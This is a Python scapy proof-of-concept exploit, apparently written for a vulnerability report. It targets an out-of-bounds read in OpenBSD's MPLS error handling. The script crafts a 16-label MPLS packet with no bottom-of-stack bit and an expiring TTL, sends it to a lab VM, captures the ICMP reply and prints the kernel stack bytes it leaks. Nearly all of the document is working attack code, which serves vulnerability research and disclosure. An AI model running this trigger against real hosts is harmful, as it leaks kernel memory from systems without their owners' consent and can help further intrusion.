#!/usr/bin/env python3
"""
PoC for report-008: MPLS label stack OOB read in mpls_do_error.

When 16 MPLS labels arrive with no BoS bit set and TTL expires,
nstk reaches 16 and (nstk+1)*sizeof(shim_hdr) = 17 entries are
passed to icmp_do_exthdr / m_copyback. The 17th entry (stack[16])
is adjacent kernel stack memory, reflected back in the ICMP error's
MPLS extension object.

Setup required:
  Host:    tap0 at 192.168.100.1
  OpenBSD: vio0 at 192.168.100.2, mpls enabled

OpenBSD setup commands (as root):
  # ifconfig vio0 192.168.100.2/24 mpls up
  # sysctl net.mpls.ttl=255

Usage:
  sudo python3 poc-008-mpls-stack-leak.py [--iface tap0] [--dst 192.168.100.2]
"""

import argparse
import sys
from scapy.all import Ether, IP, ICMP, sendp, sniff, get_if_hwaddr, get_if_list, srp, ARP
from scapy.contrib.mpls import MPLS

MPLS_INKERNEL_LOOP_MAX = 16


def resolve_mac(dst_ip, iface, src_ip):
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=dst_ip, psrc=src_ip),
        iface=iface, timeout=2, verbose=False
    )
    if not ans:
        return None
    return ans[0][1][ARP].hwsrc


def build_trigger(dst_mac, src_mac, dst_ip, src_ip):
    """
    16 MPLS labels, no BoS on any, outermost TTL=1 so it expires on ingress.
    Inner IPv4 payload so mpls_do_error takes the IPVERSION branch.
    """
    inner = IP(src=src_ip, dst=dst_ip, ttl=64, proto=1) / ICMP()

    stack = None
    for i in range(MPLS_INKERNEL_LOOP_MAX - 1, -1, -1):
        ttl = 1 if i == 0 else 64
        lbl = MPLS(label=100 + i, s=0, ttl=ttl)
        stack = lbl / stack if stack else lbl

    return Ether(src=src_mac, dst=dst_mac, type=0x8847) / stack / inner


def parse_extension(icmp_raw):
    # ICMP extensions follow 128 bytes of original datagram
    offset = 128
    if len(icmp_raw) <= offset:
        return None
    return icmp_raw[offset:]


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--iface", default="tap0")
    parser.add_argument("--dst",   default="192.168.100.2")
    parser.add_argument("--src",   default="192.168.100.1")
    args = parser.parse_args()

    if args.iface not in get_if_list():
        print(f"ERROR: interface {args.iface} not found", file=sys.stderr)
        sys.exit(1)

    src_mac = get_if_hwaddr(args.iface)

    print(f"Resolving MAC for {args.dst}...")
    dst_mac = resolve_mac(args.dst, args.iface, args.src)
    if not dst_mac:
        print("ARP failed -- is the VM up and vio0 configured?")
        sys.exit(1)
    print(f"  {args.dst} is at {dst_mac}")

    pkt = build_trigger(dst_mac, src_mac, args.dst, args.src)

    # The kernel's mpls_do_error builds an ICMP error, prepends (nstk+1)=17
    # shim headers (one past the 16-entry stack[]), then mpls_input SWAPs
    # label 100->200 and sends it back as EtherType 0x8847. We capture that.
    from scapy.all import AsyncSniffer
    is_mpls_from_vm = lambda p: (
        p.haslayer('Ether') and
        p['Ether'].type == 0x8847 and
        p['Ether'].src == dst_mac
    )
    sniffer = AsyncSniffer(iface=args.iface, count=1, timeout=5,
                           lfilter=is_mpls_from_vm)
    sniffer.start()

    print(f"Sending {MPLS_INKERNEL_LOOP_MAX}-label no-BoS packet (outermost TTL=1)...")
    sendp(pkt, iface=args.iface, verbose=False)

    sniffer.join(timeout=5)
    replies = sniffer.results or []

    if not replies:
        print("\nNo MPLS reply received.")
        print("Fix: in the VM as root, swap the route:")
        print("  route delete -mpls -in 100 -pop -inet 192.168.100.1")
        print("  route add -mpls -in 100 -swap -out 200 -inet 192.168.100.1")
        return

    reply = replies[0]
    raw = bytes(reply)[14:]  # strip 14-byte Ethernet header
    print(f"\nMPLS reply received ({len(raw)} bytes)  [TRIGGER CONFIRMED]")

    # Wire packet structure (after Ethernet):
    #   [0]      label 200        — SWAP outgoing label (replaced stack[0]=100)
    #   [1..15]  labels 101–115   — stack[1..15], all s=0
    #   [16]     stack[16]        — OOB read: 4 bytes past the 64-byte stack[] array
    #   [17+]    inner IP/ICMP    — bytes misread as shims by this loop
    #
    # Expected labels 101-115 have raw 0x00065040 .. 0x00073040 pattern.
    # stack[16] will NOT match that pattern.
    EXPECTED_SHIMS = MPLS_INKERNEL_LOOP_MAX + 1  # 1 SWAP + 15 inner + 1 leaked

    print(f"\nMPLS shim headers (first {EXPECTED_SHIMS + 2} parsed):")
    offset = 0
    shim_count = 0
    ip_start = None
    while offset + 4 <= len(raw) and shim_count < EXPECTED_SHIMS + 2:
        chunk = raw[offset:offset+4]
        val   = int.from_bytes(chunk, 'big')
        label = (val >> 12) & 0xFFFFF
        s     = (val >> 8)  & 0x1
        ttl   =  val        & 0xFF
        if shim_count == 0:
            tag = "  (SWAP outgoing label)"
        elif shim_count == MPLS_INKERNEL_LOOP_MAX:
            # slot 16: 1 SWAP + 15 inner labels (101-115) = index 16 = stack[16]
            tag = "  <-- stack[16] LEAKED KERNEL STACK BYTES"
            leaked_bytes = chunk
        elif shim_count >= MPLS_INKERNEL_LOOP_MAX:
            tag = "  (inner IP header)"
            if ip_start is None:
                ip_start = offset
        else:
            tag = ""
        print(f"  [{shim_count:2d}] label={label:<6} s={s} ttl={ttl:<3}  raw={chunk.hex()}{tag}")
        offset += 4
        shim_count += 1
        if s == 1 and ip_start is None:
            ip_start = offset
            break

    # The actual IP packet starts at offset 17*4 = 68 bytes (17 MPLS shims on wire)
    # regardless of how many the loop consumed.
    ip_offset = EXPECTED_SHIMS * 4  # 17 * 4 = 68
    if ip_start is None:
        ip_start = ip_offset

    # Verify: shim count in reply
    # A correct implementation would return NULL (no reply) or send <=16 shims.
    # Seeing 17 shims (SWAP + 15 inner + 1 leaked) proves the OOB read.
    oob_confirmed = shim_count > MPLS_INKERNEL_LOOP_MAX
    if not oob_confirmed:
        print(f"\nNOT TRIGGERED")


if __name__ == "__main__":
    main()
